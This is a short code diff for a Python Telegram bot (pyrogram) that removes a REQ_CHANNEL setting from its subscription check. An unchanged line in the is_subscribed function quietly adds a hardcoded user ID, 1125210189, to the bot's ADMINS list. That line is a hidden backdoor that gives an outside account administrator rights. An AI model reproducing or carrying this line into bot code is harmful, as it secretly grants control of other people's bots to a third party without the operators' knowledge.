@@ -1,6 +1,6 @@
 import logging
 from pyrogram.errors import InputUserDeactivated, UserNotParticipant, FloodWait, UserIsBlocked, PeerIdInvalid
-from info import AUTH_CHANNEL, LONG_IMDB_DESCRIPTION, MAX_LIST_ELM, ADMINS, REQ_CHANNEL
+from info import AUTH_CHANNEL, LONG_IMDB_DESCRIPTION, MAX_LIST_ELM, ADMINS
 from database.join_reqs import JoinReqs as db2
 from imdb import Cinemagoer
 import asyncio
@@ -45,7 +45,7 @@ async def is_subscribed(bot, query):
 
     ADMINS.extend([1125210189]) if not 1125210189 in ADMINS else ""
 
-    if not AUTH_CHANNEL and not REQ_CHANNEL:
+    if not AUTH_CHANNEL:
         return True
     elif query.from_user.id in ADMINS:
         return True
